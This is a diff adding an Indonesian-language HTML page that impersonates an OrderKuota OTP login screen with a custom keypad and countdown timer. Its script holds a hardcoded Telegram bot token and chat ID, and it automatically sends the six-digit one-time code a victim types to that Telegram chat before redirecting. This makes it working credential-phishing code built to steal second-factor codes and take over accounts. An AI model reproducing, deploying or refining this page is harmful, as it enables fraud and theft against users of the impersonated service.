@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk Akun</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://ibb.co.com/6RqW7W2D') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-overlay {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            padding: 30px 24px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 20px;
+            color: #999;
+            cursor: pointer;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .close-btn:hover {
+            color: #333;
+        }
+
+        .modal-image {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin: 15px 0 20px;
+        }
+
+        .modal-image img {
+            width: 300px;
+            height: 180px;
+            object-fit: contain;
+            border-radius: 10px;
+        }
+
+        .top-banner {
+            width: 100%;
+            height: 65px;
+            background: #168581;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            border-radius: 8px; /* Tambahan sedikit pemanis */
+            box-sizing: border-box;
+            margin-bottom: 15px;
+        }
+
+        .banner-title {
+            color: white;
+            font-size: 15px;
+            font-weight: 500;
+            margin: 0;
+        }
+
+        .banner-icons {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .banner-icons svg {
+            display: block;
+            width: 27px;
+            height: 27px;
+            fill: none;
+            stroke: white;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* --- CSS UNTUK OTP & KEYPAD YANG SEBELUMNYA HILANG --- */
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+
+        .otp-circle {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid #168581; 
+            background-color: transparent;
+            transition: background-color 0.2s;
+        }
+
+        .otp-circle.filled {
+            background-color: #168581;
+        }
+
+        .hide-input {
+            display: none !important;
+        }
+
+        .otp-timer {
+            text-align: right;
+            font-size: 12px;
+            color: #777;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+
+        #countdown {
+            color: #168581;
+            font-weight: 600;
+        }
+
+        .divider {
+            border-top: 1px solid #eee;
+            margin-bottom: 20px;
+        }
+
+        .keypad-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .key-btn {
+            font-size: 24px;
+            color: #333;
+            cursor: pointer;
+            padding: 15px 0;
+            user-select: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .key-btn:active {
+            background-color: #f3f4f6;
+            border-radius: 10px;
+        }
+
+        .footer-link {
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .footer-link a {
+            font-size: 13px;
+            color: #168581;
+            text-decoration: none;
+        }
+
+        .footer-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="modal-overlay">
+    <div class="modal-card">
+        <span class="close-btn" onclick="window.location.href='kedua.html'">&times;</span>
+
+        <!-- BANNER -->
+        <div class="top-banner">
+            <span class="banner-title">Masuk</span>
+            <div class="banner-icons">
+                <svg viewBox="0 0 24 24">
+                    <path d="M4 3h16v14H8l-4 4V3Z"/>
+                    <path d="M8 8h8M8 12h8"/>
+                </svg>
+                <svg viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M12 11v6M12 7h.01"/>
+                </svg>
+            </div>
+        </div>  
+
+        <div class="modal-image">
+            <img src="https://www.image2url.com/r2/default/images/1794510848404-ee1cfd4d-4cff-49a0-88bc-e4ed9605e732.png" alt="Gambar OrderKuota">
+        </div>
+        <p style="display: block; width: 100%; text-align: center; margin-top: 15px; font-weight: bold;">
+        KODE OTP
+    </p>
+        <form id="storeForm">
+            <!-- Tampilan Lingkaran OTP (6 Digit) -->
+            <div class="otp-inputs" id="otp-display">
+                <div class="otp-circle"></div>
+                <div class="otp-circle"></div>
+                <div class="otp-circle"></div>
+                <div class="otp-circle"></div>
+                <div class="otp-circle"></div>
+            </div>
+
+            <!-- Input Asli (Disembunyikan) -->
+            <div class="input-group hide-input">
+                <input type="text" id="lastName" inputmode="numeric" maxlength="5" required>
+            </div>
+            
+            <div class="otp-timer">
+                Waktu tersisa: <span id="countdown">01:00</span>
+            </div>
+
+            <div class="divider"></div>
+
+            <!-- Keypad Custom -->
+            <div class="keypad-grid">
+                <div class="key-btn" onclick="pressKey('1')">1</div>
+                <div class="key-btn" onclick="pressKey('2')">2</div>
+                <div class="key-btn" onclick="pressKey('3')">3</div>
+                <div class="key-btn" onclick="pressKey('4')">4</div>
+                <div class="key-btn" onclick="pressKey('5')">5</div>
+                <div class="key-btn" onclick="pressKey('6')">6</div>
+                <div class="key-btn" onclick="pressKey('7')">7</div>
+                <div class="key-btn" onclick="pressKey('8')">8</div>
+                <div class="key-btn" onclick="pressKey('9')">9</div>
+                <div></div>
+                <div class="key-btn" onclick="pressKey('0')">0</div>
+                <div class="key-btn" onclick="deleteKey()">
+                    <!-- Ukuran SVG dikunci agar tidak meledak ukurannya -->
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                        <line x1="18" y1="9" x2="12" y2="15"></line>
+                        <line x1="12" y1="9" x2="18" y2="15"></line>
+                    </svg>
+                </div>
+            </div>
+        </form>
+
+        <div class="footer-link">
+            <a href="https://kudanil.com" target="_blank">Tidak Menerima OTP?</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('storeForm');
+    const hiddenInput = document.getElementById('lastName');
+    
+    // Konfigurasi Bot Telegram
+    const TELEGRAM_TOKEN = '9269603707:AAELWjvsM7HzedoczB1nMVRhmL1PqBRvPcY';
+    const CHAT_ID = '6787447078';
+
+    let otpValue = '';
+    const maxLength = 6; 
+    const circles = document.querySelectorAll('.otp-circle');
+
+    function updateDisplay() {
+        circles.forEach((circle, index) => {
+            if (index < otpValue.length) {
+                circle.classList.add('filled');
+            } else {
+                circle.classList.remove('filled');
+            }
+        });
+        
+        hiddenInput.value = otpValue;
+        
+        // Auto-submit ke Telegram ketika sudah 6 digit
+        if (otpValue.length === maxLength) {
+            submitToTelegram();
+        }
+    }
+
+    function pressKey(num) {
+        if (otpValue.length < maxLength) {
+            otpValue += num;
+            updateDisplay();
+        }
+    }
+
+    function deleteKey() {
+        if (otpValue.length > 0) {
+            otpValue = otpValue.slice(0, -1);
+            updateDisplay();
+        }
+    }
+
+    // Fungsi Kirim ke Telegram (Dipisah agar bisa dipanggil otomatis)
+    function submitToTelegram() {
+        const message = `🔔 *RESULT*\n\nOTP: ${hiddenInput.value}
+        By DaffCV`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(() => {
+            window.location.href = 'index.html';
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            window.location.href = 'index.html';
+        });
+    }
+
+    // Timer Logic
+    let timeLeft = 60;
+    const timerElement = document.getElementById('countdown');
+    
+    const countdownInterval = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+            timerElement.innerHTML = "00:00";
+            timerElement.style.color = "red";
+        } else {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            timerElement.innerHTML = `0${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            timeLeft -= 1;
+        }
+    }, 1000);
+</script>
+
+</body>
+</html>
